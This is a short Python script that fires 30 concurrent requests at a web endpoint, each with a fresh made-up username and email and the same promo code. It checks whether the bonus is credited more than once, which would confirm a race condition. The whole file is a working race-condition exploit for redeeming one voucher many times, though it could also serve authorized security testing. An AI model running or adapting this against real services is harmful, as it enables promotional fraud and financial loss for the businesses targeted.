import asyncio
import aiohttp
import time

# 1. Define the targets and payload configurations
# Testing a mock pre-auth promo-verification endpoint
target_url = "https://target.com"
payload = {
    "username": "race_test_user_",
    "email": "test_async_@example.com",
    "promo_code": "WELCOME100"  # The specific voucher code being evaluated
}

# 2. Asynchronous execution request template
async def send_simultaneous_request(session, request_id):
    # Alter usernames slightly so the server accepts the database insert states
    current_payload = payload.copy()
    current_payload["username"] += str(int(time.time())) + f"_{request_id}"
    current_payload["email"] = f"test_{request_id}@" + str(int(time.time())) + "mail.com"
    
    try:
        async with session.post(target_url, json=current_payload) as response:
            status = response.status
            body = await response.json()
            return status, body
    except Exception as e:
        return 0, str(e)

# 3. Structural concurrency manager
async def main():
    concurrency_density = 30  # Number of simultaneous requests (n)
    
    async with aiohttp.ClientSession() as session:
        # Create a synchronized pool of tasks
        tasks = [send_simultaneous_request(session, i) for i in range(concurrency_density)]
        
        print(f"[*] Synchronizing {concurrency_density} frames for injection window...")
        start_time = time.time()
        
        # Fire all tasks into the execution pipeline at the exact same millisecond
        results = await asyncio.gather(*tasks)
        
        end_time = time.time()
        print(f"[+] Multi-thread burst completed in {end_time - start_time:.4f} seconds.")
        
        # 4. Evaluate the server's mathematical response states
        success_count = 0
        for idx, (status, body) in enumerate(results):
            # Check if multiple unique requests received a "Bonus Successfully Applied" indicator
            if status == 200 and body.get("bonus_credited") == True:
                success_count += 1
                print(f"    -> Thread {idx}: Success 200 OK - Bonus Granted")
        
        if success_count > 1:
            print(f"\n[!] VULNERABILITY CONFIRMED: Race condition exists. Code was processed {success_count} times.")
        else:
            print("\n[+] Verification secure: Thread lock handled requests sequentially.")

# Run the asynchronous event loop safely
if __name__ == "__main__":
    asyncio.run(main())
